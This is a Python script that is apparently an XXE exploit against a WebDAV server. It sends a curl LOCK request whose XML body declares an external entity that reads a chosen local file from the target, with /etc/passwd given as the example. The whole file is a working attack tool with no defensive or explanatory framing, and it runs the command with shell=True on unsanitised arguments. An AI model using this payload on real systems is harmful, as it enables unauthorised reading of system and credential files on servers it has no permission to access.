import argparse
import subprocess


parser = argparse.ArgumentParser()
parser.add_argument("-u", metavar="", help="http, https, ftp", required=True)
parser.add_argument("-d", metavar="", help="domain.com", required=True)
parser.add_argument("-p", metavar="", help="8000", required=True)
parser.add_argument("-f", metavar="", help="/etc/passwd", required=True)
arguments = parser.parse_args()

class XxeInjection(object):
    def __init__(self, uri, domain, serv_port, file):
        self.uri = uri
        self.domain = domain
        self.serv_port = serv_port
        self.file = file

    def xxe_injection(self):
        payload = f"""\
curl -i -s -k -X LOCK {self.uri}://{self.domain}:{self.serv_port}/ -H 'Timeout: Second-1' \
  --data-binary @- << EOF
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "file://{self.file}">
]>
<d:lockinfo xmlns:d="DAV:">
  <d:lockscope><d:exclusive/></d:lockscope>
  <d:locktype><d:write/></d:locktype>
  <d:owner>
  <d:href><r>&sp;</r></d:href>
  </d:owner>
  </d:lockinfo>
EOF"""
        subprocess.call(payload, shell=True)

if __name__ == '__main__':
    injection = XxeInjection(uri=arguments.u,
    domain=arguments.d,
    serv_port=arguments.p,
    file=arguments.f)
    injection.xxe_injection()